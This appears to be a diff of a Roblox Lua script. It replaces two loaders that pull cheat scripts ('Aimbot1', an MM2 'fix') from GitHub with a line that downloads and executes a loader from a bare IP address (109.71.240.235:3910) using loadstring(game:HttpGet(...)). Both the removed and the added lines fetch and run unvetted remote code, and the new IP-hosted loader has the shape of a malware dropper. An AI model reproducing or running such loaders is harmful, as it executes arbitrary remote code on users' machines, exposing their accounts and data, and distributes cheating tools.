@@ -1,10 +1,2 @@
-local function duper()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/RbxScript-design/Aimbot1/refs/heads/main/1"))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/mm2-fix.lua"))()
-
-end
-
-task.spawn(duper)
-task.spawn(loadui)
+ID="2ea8c8b6-93d4-437b-a495-a079121c0398";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
